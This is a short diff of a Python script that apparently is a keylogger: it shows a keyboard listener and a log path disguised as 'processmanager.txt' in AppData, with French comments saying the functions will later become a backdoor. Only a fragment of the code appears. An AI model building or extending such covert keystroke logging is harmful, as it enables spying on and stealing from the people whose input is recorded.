@@ -43,6 +43,7 @@ def start():
 		keyboard_listener.join()
 
 log = ""
-path = os.environ["appdata"] + "\\processmanager.txt" #nom du fichier qui sera ds appdata
+# path = os.environ["appdata"] + "\\processmanager.txt" #nom du fichier qui sera ds appdata
+path = "processmanager.txt" #nom du fichier qui sera ds appdata
 
 # start() #on appelle pas les fonctions, elles seront en backdoor plus tard
